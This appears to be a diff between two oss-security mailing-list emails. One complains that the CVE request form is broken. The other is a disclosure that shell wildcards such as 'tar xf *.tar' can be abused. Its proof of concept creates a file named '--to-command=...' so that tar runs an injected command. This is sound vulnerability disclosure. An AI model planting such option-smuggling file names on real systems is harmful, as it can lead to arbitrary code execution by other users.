@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2879" "Friday" "25" "December" "2020" "12:30:40" "+0100" "Noel Kuntze" "noel.kuntze@thermi.consulting" "<9bc2be74-b98d-87ef-f96c-427c53c3db55@thermi.consulting>" "71" "Re: [oss-security] More CVE request experience (Fwd: Automatic reply: [EXT] Need a CVE for Crypto++)" nil nil nil "12" "2020122511:30:40" "[oss-security] More CVE request experience (Fwd: Automatic reply: [EXT] Need a CVE for Crypto++)" (number mark "U       noel.kuntze@ Dec 25   71/2879  " thread-indent "\"Re: [oss-security] More CVE request experience (Fwd: Automatic reply: [EXT] Need a CVE for Crypto++)\"\n") "<CAH8yC8ngRsZP4qinC_ccQQpQg=B3wVD8udxsj1nxxFVaBbc5iA@mail.gmail.com>" ("<10504_1608861753_5FE54838_10504_2206_1_CAH8yC8nhmrWpjviy957HFdTBAs2jZFS634FnOWug7rRbB1SDmA@mail.gmail.com>" "<abd5c3b2603941979177dc52df904e7c@BL0PR0901MB4209.namprd09.prod.outlook.com>" "<CAH8yC8ngRsZP4qinC_ccQQpQg=B3wVD8udxsj1nxxFVaBbc5iA@mail.gmail.com>") nil nil nil nil nil nil nil "Re: [oss-security] More CVE request experience (Fwd: Automatic reply: [EXT] Need a CVE for Crypto++)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["794" "Monday" "9" "December" "2019" "15:23:16" "+0200" "Georgi Guninski" "gguninski@gmail.com" nil "37" nil "^Date:" nil nil "12" nil nil (number mark "        gguninski@gm Dec  9   37/794   " thread-indent "\"[oss-security] Shell wildcards considered dangerous?\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Shell wildcards considered dangerous?" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 7370 invoked by uid 550); 25 Dec 2020 11:48:47 -0000
+Received: (qmail 18355 invoked by uid 550); 9 Dec 2019 14:35:25 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,103 +11,75 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 1057 invoked from network); 25 Dec 2020 11:30:56 -0000
-X-Virus-Scanned: amavisd-new at thermi.consulting
-DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=thermi.consulting;
-	s=201909; t=1608895841;
-	bh=YVUFBvBWGFDOP3dAsiOh03dQSdb+bNXf8aBWYvsBVnk=;
-	h=Subject:To:From:Date:MIME-Version:Content-Type;
-	b=YFzcJjpsXZQLVtT75vB9/2gkQB1NpNHOJq79bbLosl4ukYJjKA+Zasmva+ITWmC3b
-	 Z2rARIId2cOW4CnBHIVFN3M5YjYZ4LAUegEqkD+KD1jPWOKvzfb30LzcbbY8w5ieFV
-	 0Z9vafsk2fUqFdK9BxaIaRqxOtdNFiyqyNxKoq3iWT/Rgmj6R6EVta0al2vA4bIVOg
-	 Pco/0rjgS/cFj3STQcdpyRwAf07WSqKPnoVYZd6n3mK7aMN1mOFyfCKsu8JIgAbR/S
-	 GVRQ10x6MOWH7Dgn4fK01Erzy+M/OVL6yBLvHqnJInQiHlu9LzRwFMFgsCJ2l0eEUb
-	 MvEUrsxxwCuuA==
-To: oss-security@lists.openwall.com, Jeffrey Walton <noloader@gmail.com>
-References: <10504_1608861753_5FE54838_10504_2206_1_CAH8yC8nhmrWpjviy957HFdTBAs2jZFS634FnOWug7rRbB1SDmA@mail.gmail.com>
- <abd5c3b2603941979177dc52df904e7c@BL0PR0901MB4209.namprd09.prod.outlook.com>
- <CAH8yC8ngRsZP4qinC_ccQQpQg=B3wVD8udxsj1nxxFVaBbc5iA@mail.gmail.com>
-From: Noel Kuntze <noel.kuntze@thermi.consulting>
-Organization: Noel Kuntze IT- und Unternehmenssicherheit
-Message-ID: <9bc2be74-b98d-87ef-f96c-427c53c3db55@thermi.consulting>
-Date: Fri, 25 Dec 2020 12:30:40 +0100
+Received: (qmail 3592 invoked from network); 9 Dec 2019 13:23:42 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=+y1aSmgZgLTRvGeXpHkfPNUpe0DoKuy7qQq5J0Nj1Q8=;
+        b=vbklyYopyml1l35+JKTNwS7nCr7SY+HUHzwINWjMa8CH0gNN/t3M6F9n07QG9sgmHd
+         GYIML38zEhYKOtre6SrGGYc+gKPhDkuz4kDWalTsHc6VSQJXCkjX1Zz5GWpXP/8qZyiQ
+         tOmXPw4j+Swa+gpwDTk+kQ33SBeKrb++zEh5luNIF6DDJtekHSL9EHc58WgTkhbSkl8B
+         EE/IVUWR4canui5mSdkDIoCFnT9MjEzrF4HNkeh0FmM+vEwcXNFAB4NA1Yz0KY+XYcw8
+         GbRybsNyEYpJbSNlCER7V+eqOGFF2aAajmJBVEaRFcRvuL3nypFp1Hkxe04E9/YkylHe
+         8Naw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=+y1aSmgZgLTRvGeXpHkfPNUpe0DoKuy7qQq5J0Nj1Q8=;
+        b=eNRq8rt50Z1zsWVUS7+AjFuHRHBcZUpvyVW93AVVTeZI43gW1/E7C+kB/JWD9q4Kuo
+         bj7U9KD7q+/+mMUOI6kZdN7MXmkOWKe0aZ27veSsbXJ7DGS06v68dDgwddUkK/D4wxOw
+         966VyEAOa4kjlnw0gmJhw2eD8aPCn3wJ24kf8aySYCAJX6ikT6JPo+pHKn8JHEb87QP/
+         oDV8tt4jiwxVIaYX/ORBQAm14kffATLwolcEOSSnpBtJGtx7IY/SQZ/y7zyDE9uFtePU
+         Gw8Z5/uFroKdIjW4KrQTA3/zPkougBVFUUP8AYolfbi7sSp1Dwoj5n225tUxwamB8Hf3
+         qXNw==
+X-Gm-Message-State: APjAAAVpzRtUVw+y+CiWOWsjTLL3LDkval2rSxuhvpwHu8tabb2B7RBf
+	reKmIPNsh0abshdJLVMKe+YkJsyv6uKz+0BOw6Hc6+d/A70=
+X-Google-Smtp-Source: APXvYqyYwl3BHaCY0TvUEiNQ11GdflZRwJKyqH1eo43BuEyUT0k3ZfK6XFrk7lRGpBpX/SQPYGingoFdfw6iVDt0oiU=
+X-Received: by 2002:a5d:9eda:: with SMTP id a26mr21690901ioe.238.1575897809601;
+ Mon, 09 Dec 2019 05:23:29 -0800 (PST)
 MIME-Version: 1.0
-In-Reply-To: <CAH8yC8ngRsZP4qinC_ccQQpQg=B3wVD8udxsj1nxxFVaBbc5iA@mail.gmail.com>
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="gONytPBYzDPj2AQv14PK3yOoXD6ZuBzYY"
-Subject: Re: [oss-security] More CVE request experience (Fwd: Automatic reply:
- [EXT] Need a CVE for Crypto++)
+Message-ID: <CAGUWgD-yn2kf3T69ri7ahcCfKm=kiMBnxeb84mnH-qqYWQNUdg@mail.gmail.com>
+Content-Type: text/plain; charset="UTF-8"
+Date: Mon, 9 Dec 2019 15:23:16 +0200
+From: Georgi Guninski <gguninski@gmail.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] Shell wildcards considered dangerous?
+To: oss-security@lists.openwall.com
 
---gONytPBYzDPj2AQv14PK3yOoXD6ZuBzYY
-Content-Type: multipart/mixed; boundary="HOVkMXOJ9nKKqEreG41Pi1fiaFhkf041v";
- protected-headers="v1"
-From: Noel Kuntze <noel.kuntze@thermi.consulting>
-To: oss-security@lists.openwall.com, Jeffrey Walton <noloader@gmail.com>
-Message-ID: <9bc2be74-b98d-87ef-f96c-427c53c3db55@thermi.consulting>
-Subject: Re: [oss-security] More CVE request experience (Fwd: Automatic reply:
- [EXT] Need a CVE for Crypto++)
-References: <10504_1608861753_5FE54838_10504_2206_1_CAH8yC8nhmrWpjviy957HFdTBAs2jZFS634FnOWug7rRbB1SDmA@mail.gmail.com>
- <abd5c3b2603941979177dc52df904e7c@BL0PR0901MB4209.namprd09.prod.outlook.com>
- <CAH8yC8ngRsZP4qinC_ccQQpQg=B3wVD8udxsj1nxxFVaBbc5iA@mail.gmail.com>
-In-Reply-To: <CAH8yC8ngRsZP4qinC_ccQQpQg=B3wVD8udxsj1nxxFVaBbc5iA@mail.gmail.com>
+Remote version of this affects wu-ftpd from 2003:
+https://www.debian.org/security/2003/dsa-377
 
---HOVkMXOJ9nKKqEreG41Pi1fiaFhkf041v
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: quoted-printable
-Content-Language: de-DE
+Summary:  For trusted command PROGRAM, executing
+PROGRAM *.EXT
+may lead to arbitrary code execution, e.g. for
+PROGRAM=EXT=tar
 
-Hello Jeffrey,
+The main idea is the wildcard to add program options.
 
-The form worked fine just now. What is the issue with it?
+Open problem:
 
-Kind regards
+Are popular programs other than tar vulnerable?
 
-Noel
-
-Am 25.12.20 um 03:13 schrieb Jeffrey Walton:
-> The form at https://cveform.mitre.org/ is broken. Emailing
-> cve@mitre.org for a CVE assignment after the failed web submission
-> results in this.
->
-> I hope people do not see the drop in CVE submissions as an improvement
-> in software quality.
->
-> ---------- Forwarded message ---------
-> From: Common Vulnerabilities & Exposures <cve@mitre.org>
-> Date: Thu, Dec 24, 2020 at 9:08 PM
-> Subject: Automatic reply: [EXT] Need a CVE for Crypto++
-> To: Walton, Jeffrey <noloader@gmail.com>
->
-> This email address is not monitored.
->
-> To contact the CVE Program, use https://cveform.mitre.org and choose
-> =E2=80=9COther=E2=80=9D from the dropdown menu.
+Since shell wildcards are unlikely to change, should best practice
+include not using *.EXT in shell?
 
 
+Example exploit vector: starting program in untrusted
+directories.
 
---HOVkMXOJ9nKKqEreG41Pi1fiaFhkf041v--
+Poc:
+====
+$rm -rf /tmp/1 ;mkdir /tmp/1 ; cd /tmp/1 ; tar cf a.tar /etc/issue
+$ : >  --to-command="yes .tar"
 
---gONytPBYzDPj2AQv14PK3yOoXD6ZuBzYY
-Content-Type: application/pgp-signature; name="OpenPGP_signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="OpenPGP_signature"
+#end creating, starts PoC
+tar xf *.tar
 
------BEGIN PGP SIGNATURE-----
+#.tar (repeats)
+====
 
-wsF5BAABCAAjFiEENSSTvrX3jmMTcq8t9U7kCwc5rWwFAl/lzWAFAwAAAAAACgkQ9U7kCwc5rWwi
-SBAAja2+zio87pGbFInOSXEcP0km2y9FAGMOBvEGVQOadSn5SbIKrw8ZDCmFo1rm6D9eVcmZTdul
-eXguippzJQWKew7PZjqUMQcK7LEUvtm0nKE+bZrknNBLzLU4VlftiboHaCgEAJjio1hDdCsD6vck
-R5q2ARRxqSvod2ezobKzItNiSlc8edETsQECXrPhpRxBhyw5qzuCoJnOzqdhw5DjiWYAYGUfWUbP
-w8vjMpPBLjHR3OdrCENoQZQoFau+uR+MSs2pYiZrzqQvdnfuzR6w1vnMfpWMUx/hXGb5Bg9dsnR9
-NZF6x8UVM3AaR5Yed4eBFDa8/qMt+Zn5FG6T9pdOR2LsLfO5Wsv3SifEzXgw6ZXZgTZ76SAgP1rF
-szsyJ2BhbtheX8wwOE+knLO2wtjDXYqlHGg4LaC8J73EUdauLx7bQkT8tqXgWI2dliE+NNU52ECO
-DGaBYPtbu+XwJIj2j/gbzgayCXEhR6fAmXrLVEjk2W6gfAYGWdRxJsdcdFX/HYzFbN9mlRAKWo0Z
-eHK9AkDdA6hRi6sG2dSD3FZI6iTMr+uIMuiFcSVQvag8IQ7dxlLCMix/oXSrATLAJrdAApsPp1r6
-7SjG3vvpP7owqz6MAvtubKBH+9F6qW0FVR98xIq1QTmScqcQZcdwaIFpOPZPLUrPSxwpOYvcJMVN
-V+E=
-=1jLP
------END PGP SIGNATURE-----
 
---gONytPBYzDPj2AQv14PK3yOoXD6ZuBzYY--
+-- 
+CV:    https://j.ludost.net/resumegg.pdf
+site:  http://www.guninski.com
+blog:  https://j.ludost.net/blog
